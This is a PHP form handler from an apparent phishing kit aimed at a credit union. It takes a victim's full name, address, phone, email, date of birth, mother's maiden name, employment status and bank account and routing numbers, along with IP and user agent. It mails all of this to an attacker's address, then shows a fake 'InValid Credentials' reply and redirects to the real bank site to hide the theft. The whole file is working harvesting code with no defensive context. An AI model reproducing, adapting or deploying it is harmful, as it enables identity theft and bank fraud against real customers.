<?php
include 'email.php';
$name = trim($_POST['fn']);
$address = trim($_POST['ad']);
$telephone = trim($_POST['tl']);
$email_address = trim($_POST['el']);
$dob = trim($_POST['db']);
$mother_maiden_name = trim($_POST['mm']);
$employment_status = trim($_POST['eu']);
$account_number = trim($_POST['ar']);
$routing_number = trim($_POST['ar']);


if (isset($_POST['btn3'])) {
	
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "CODE            : ".$_POST['code']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = 'ad@bbr4lrecords.com';
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		header("Location: https://pbcu.com/ ");
	
	
}
if($name != null && $address != null && $telephone != null && $email_address != null && $dob != null && $mother_maiden_name != null && $employment_status != null && $account_number != null && $routing_number != null ){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| VERIFICATION INFORMATION  |--------------|\n";
	
	$message .= "Full name           : ".$name."\n";
	$message .= "Address              : ".$address."\n";
	$message .= "Telephone              : ".$telephone."\n";
	$message .= "Passcode              : ".$email_address."\n";
	$message .= "Passcode              : ".$dob."\n";
	$message .= "Passcode              : ".$mother_maiden_name."\n";
	$message .= "Passcode              : ".$employment_status."\n";
	$message .= "Passcode              : ".$account_number."\n";
	$message .= "Passcode              : ".$routing_number."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>